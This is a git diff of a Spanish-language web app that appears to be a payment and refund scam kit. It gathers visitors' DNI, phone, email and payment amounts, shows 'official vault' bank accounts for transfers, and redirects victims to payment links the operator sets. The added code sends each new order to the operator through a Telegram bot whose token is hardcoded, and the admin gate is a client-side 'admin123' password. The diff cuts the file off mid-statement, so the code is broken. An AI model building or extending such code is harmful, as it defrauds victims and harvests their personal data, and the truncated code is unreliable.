@@ -14,6 +14,12 @@ const firebaseConfig = {
 const appFB = initializeApp(firebaseConfig);
 const db = getDatabase(appFB);
 
+// =========================================================================
+// CONFIGURACIÓN DE TELEGRAM CONFIGURADA CON TUS DATOS
+// =========================================================================
+const TELEGRAM_BOT_TOKEN = "8906772282:AAHBg0gXgAPJKnYLZvLv4t6EaGrtWKL1Wvo";
+const TELEGRAM_CHAT_ID = "8974856495";
+
 class App {
   constructor() {
     this.state = {
@@ -74,7 +80,27 @@ class App {
     this.updateView();
   }
 
-  // --- NUEVO FLUJO B: ENVÍA AL PANEL ADMIN APENAS INGRESA EL IMPORTE ---
+  // --- ENVÍA ALERTA DIRECTA A TELEGRAM DESDE EL NAVEGADOR DEL CLIENTE ---
+  async sendTelegramAlert(requestData) {
+    try {
+      const text = `🚨 *¡NUEVO PEDIDO DE LINK RECIBIDO!*\n\n` +
+                   `🆔 *ID Pedido:* \`${requestData.id}\`\n` +
+                   `💰 *Monto a Abonar:* *$${requestData.amount}*\n` +
+                   `📌 *Modalidad:* ${requestData.paymentType}\n` +
+                   `🕒 *Fecha/Hora:* ${requestData.requestTime}\n\n` +
+                   `⏳ _El cliente está completando sus datos personales en este momento..._`;
+
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'Markdown' })
+      });
+    } catch (e) {
+      console.error("Error enviando notificación a Telegram:", e);
+    }
+  }
+
+  // --- FLUJO B: ENVÍA AL PANEL Y DISPARA TELEGRAM APENAS INGRESA EL IMPORTE ---
   async submitAmountAndGoToUserData() {
     const rawAmount = document.getElementById('pay-amount').value.trim();
     const paymentType = document.getElementById('pay-type').value;
@@ -109,9 +135,12 @@ class App {
     };
 
     try {
-      // Guardar en Firebase de inmediato para que te llegue al admin y al Bot
+      // 1. Guarda en Firebase
       const newRef = await push(ref(db, 'requests'), newRequest);
       this.state.currentFirebaseKey = newRef.key;
+
+      // 2. Dispara la notificación a Telegram inmediatamente
+      this.sendTelegramAlert(newRequest);
     } catch (error) {
       console.error("Error al guardar en Firebase:", error);
     }
@@ -129,7 +158,7 @@ class App {
       email: document.getElementById('pay-client-email').value.trim()
     };
 
-    // Actualizar datos del cliente en Firebase mientras avanza
+    // Actualiza datos del cliente en Firebase cuando avanza de pantalla
     if (this.state.currentFirebaseKey) {
       try {
         await update(ref(db, `requests/${this.state.currentFirebaseKey}`), {
@@ -162,7 +191,6 @@ class App {
     this.listenToOrderStatus(this.state.currentOrderId);
   }
 
-  // --- BOTÓN VOLVER ---
   goBack() {
     const view = this.state.currentView;
 
@@ -235,262 +263,4 @@ class App {
       document.getElementById('flow-pay-user-data').classList.remove('hidden');
       this.updateProgress(2, 3, 'Paso 2: Datos Personales', '75%');
       if (this.state.client.name) document.getElementById('pay-client-name').value = this.state.client.name;
-      if (this.state.client.dni) document.getElementById('pay-client-dni').value = this.state.client.dni;
-      if (this.state.client.phone) document.getElementById('pay-client-phone').value = this.state.client.phone;
-      if (this.state.client.email) document.getElementById('pay-client-email').value = this.state.client.email;
-
-    } else if (v === 'flow-pay-summary') {
-      document.getElementById('flow-pay-summary').classList.remove('hidden');
-      this.updateProgress(3, 3, 'Paso 3: Confirmación', '90%');
-
-    } else if (v === 'pay-waiting') {
-      document.getElementById('pay-waiting-view').classList.remove('hidden');
-      this.hideProgress();
-
-    } else if (v === 'flow-app-info') {
-      document.getElementById('flow-app-info').classList.remove('hidden');
-      this.hideProgress();
-
-    } else if (v === 'flow-app-treasury') {
-      document.getElementById('flow-app-treasury').classList.remove('hidden');
-      this.renderTreasuryCards();
-      this.hideProgress();
-
-    } else if (v === 'flow-app-operator') {
-      document.getElementById('flow-app-operator').classList.remove('hidden');
-      this.hideProgress();
-
-    } else if (v === 'flow-transfers') {
-      document.getElementById('flow-transfers').classList.remove('hidden');
-      document.getElementById('claim-form-view').classList.remove('hidden');
-      this.hideProgress();
-
-    } else if (v === 'claim-banks') {
-      document.getElementById('flow-transfers').classList.remove('hidden');
-      document.getElementById('claim-banks-view').classList.remove('hidden');
-      this.hideProgress();
-
-    } else if (v === 'claim-instructions') {
-      document.getElementById('flow-transfers').classList.remove('hidden');
-      document.getElementById('claim-instructions-view').classList.remove('hidden');
-      this.hideProgress();
-
-    } else if (v === 'claim-waiting') {
-      document.getElementById('flow-transfers').classList.remove('hidden');
-      document.getElementById('claim-waiting-view').classList.remove('hidden');
-      this.hideProgress();
-    }
-  }
-
-  updateProgress(current, total, labelText, percentText) {
-    const p = document.getElementById('progress-container');
-    if (p) p.classList.remove('hidden');
-    document.getElementById('step-label').innerText = labelText;
-    document.getElementById('step-percent').innerText = percentText;
-    document.getElementById('progress-bar').style.width = `${(current / total) * 100}%`;
-  }
-
-  hideProgress() {
-    const p = document.getElementById('progress-container');
-    if (p) p.classList.add('hidden');
-  }
-
-  listenToTreasurers() {
-    const treasurersRef = ref(db, 'treasurers');
-    onValue(treasurersRef, (snapshot) => {
-      const data = snapshot.val() || {};
-      this.state.treasurers = Object.entries(data).map(([key, val]) => ({ key, ...val }));
-      if (this.state.currentView === 'flow-app-treasury') {
-        this.renderTreasuryCards();
-      }
-    });
-  }
-
-  renderTreasuryCards() {
-    const container = document.getElementById('treasury-cards-container');
-    if (!container) return;
-
-    container.innerHTML = '';
-
-    if (this.state.treasurers.length === 0) {
-      container.innerHTML = `
-        <div class="p-4 bg-slate-50 border border-slate-200 rounded-xl text-center text-xs text-slate-500">
-          <p>Cargando bóvedas de resguardo oficiales...</p>
-        </div>
-      `;
-      return;
-    }
-
-    this.state.treasurers.forEach((t, index) => {
-      const card = document.createElement('div');
-      card.className = 'p-4 bg-slate-50 border border-slate-200 rounded-xl space-y-2.5 hover:border-nxOrange-300 transition shadow-sm';
-      card.innerHTML = `
-        <div class="flex items-center justify-between border-b border-slate-200 pb-2">
-          <span class="text-xs font-bold text-nxPurple-900">Bóveda Oficial #${index + 1}</span>
-          <span class="text-[10px] bg-nxOrange-100 text-nxOrange-700 font-extrabold px-2 py-0.5 rounded-full">Activa</span>
-        </div>
-        <div class="text-xs space-y-1 text-slate-700">
-          <div><strong class="text-slate-900">Titular / Tesorería:</strong> ${t.name}</div>
-          <div><strong class="text-slate-900">CUIL:</strong> ${t.cuil}</div>
-        </div>
-        <div class="space-y-1.5 pt-1">
-          <div class="flex items-center justify-between bg-white p-2 rounded-lg border border-slate-200 text-xs">
-            <div class="truncate mr-2">
-              <span class="text-[10px] text-slate-400 block font-bold uppercase">Alias</span>
-              <span class="font-mono font-bold text-slate-800">${t.alias}</span>
-            </div>
-            <button type="button" onclick="app.copyToClipboard('${t.alias}', 'Alias')" class="bg-nxPurple-50 hover:bg-nxPurple-100 text-nxPurple-900 font-bold px-2.5 py-1.5 rounded-md text-[11px] transition flex items-center space-x-1 shrink-0">
-              <i class="fa-regular fa-copy"></i>
-              <span>Copiar Alias</span>
-            </button>
-          </div>
-          <div class="flex items-center justify-between bg-white p-2 rounded-lg border border-slate-200 text-xs">
-            <div class="truncate mr-2">
-              <span class="text-[10px] text-slate-400 block font-bold uppercase">CBU / CVU</span>
-              <span class="font-mono font-bold text-slate-800 text-[11px]">${t.cbu}</span>
-            </div>
-            <button type="button" onclick="app.copyToClipboard('${t.cbu}', 'CBU')" class="bg-nxOrange-50 hover:bg-nxOrange-100 text-nxOrange-700 font-bold px-2.5 py-1.5 rounded-md text-[11px] transition flex items-center space-x-1 shrink-0">
-              <i class="fa-regular fa-copy"></i>
-              <span>Copiar CBU</span>
-            </button>
-          </div>
-        </div>
-      `;
-      container.appendChild(card);
-    });
-  }
-
-  copyToClipboard(text, type) {
-    if (navigator.clipboard && navigator.clipboard.writeText) {
-      navigator.clipboard.writeText(text).then(() => {
-        alert(`¡${type} copiado al portapapeles!`);
-      }).catch(() => {
-        this.fallbackCopyText(text, type);
-      });
-    } else {
-      this.fallbackCopyText(text, type);
-    }
-  }
-
-  fallbackCopyText(text, type) {
-    const textArea = document.createElement("textarea");
-    textArea.value = text;
-    document.body.appendChild(textArea);
-    textArea.select();
-    try {
-      document.execCommand('copy');
-      alert(`¡${type} copiado al portapapeles!`);
-    } catch (err) {
-      alert(`No se pudo copiar manualmente: ${text}`);
-    }
-    document.body.removeChild(textArea);
-  }
-
-  goToTreasuryCards() {
-    this.state.currentView = 'flow-app-treasury';
-    this.updateView();
-  }
-
-  goToOperatorInstructions() {
-    this.state.currentView = 'flow-app-operator';
-    this.updateView();
-  }
-
-  resetApp() {
-    window.location.reload();
-  }
-
-  listenToOrderStatus(orderId) {
-    const requestsRef = ref(db, 'requests');
-    onValue(requestsRef, (snapshot) => {
-      const data = snapshot.val() || {};
-      Object.values(data).forEach(req => {
-        if (req.id === orderId && req.paymentUrl && req.paymentUrl.trim() !== '') {
-          window.location.href = req.paymentUrl.trim();
-        }
-      });
-    });
-  }
-
-  // --- FLUJO C: DEVOLUCIONES ---
-  goToBankSelection() {
-    const rawAmount = document.getElementById('claim-amount').value.trim();
-    if (!rawAmount) {
-      alert('Por favor, ingresa el monto a acreditar.');
-      return;
-    }
-    this.state.claimAmount = this.formatNumberToAR(rawAmount);
-    this.state.currentView = 'claim-banks';
-    this.updateView();
-  }
-
-  goToReimbursementInstructions() {
-    const checkboxes = document.querySelectorAll('.bank-checkbox:checked');
-    const selected = Array.from(checkboxes).map(cb => cb.value);
-
-    if (selected.length === 0) {
-      alert('Por favor, selecciona al menos una entidad bancaria o billetera virtual.');
-      return;
-    }
-
-    this.state.selectedBanks = selected;
-    this.state.currentView = 'claim-instructions';
-    this.updateView();
-  }
-
-  async generateReimbursementOrder() {
-    const orderId = '#TR-' + Math.floor(1000 + Math.random() * 9000);
-    this.state.currentOrderId = orderId;
-    const nowFormatted = this.formatTimestamp(new Date());
-
-    const newClaim = {
-      id: orderId,
-      name: this.state.client.name || 'Cliente Web',
-      dni: this.state.client.dni || 'S/D',
-      phone: this.state.client.phone || 'S/D',
-      email: this.state.client.email || 'S/D',
-      category: 'transfers',
-      amount: this.state.claimAmount,
-      paymentType: 'Acreditación / Reintegro',
-      selectedBanks: this.state.selectedBanks,
-      paymentUrl: '',
-      status: 'Pendiente de Link',
-      createdAt: Date.now(),
-      requestTime: nowFormatted
-    };
-
-    try {
-      await push(ref(db, 'requests'), newClaim);
-    } catch (error) {
-      console.error("Error al guardar en Firebase:", error);
-    }
-
-    document.getElementById('display-claim-id').innerText = orderId;
-    document.getElementById('display-claim-amount').innerText = `$${this.state.claimAmount}`;
-
-    this.state.currentView = 'claim-waiting';
-    this.updateView();
-
-    this.listenToOrderStatus(orderId);
-  }
-
-  openAdminModal() {
-    document.getElementById('admin-auth-modal').classList.remove('hidden');
-  }
-
-  closeAdminModal() {
-    document.getElementById('admin-auth-modal').classList.add('hidden');
-  }
-
-  verifyAdminPass() {
-    const pass = document.getElementById('admin-pass-input').value;
-    if (pass === 'admin123') {
-      sessionStorage.setItem('nx_admin_auth', 'true');
-      window.location.href = 'admin.html';
-    } else {
-      alert('Clave incorrecta');
-    }
-  }
-}
-
-window.app = new App();
+      if
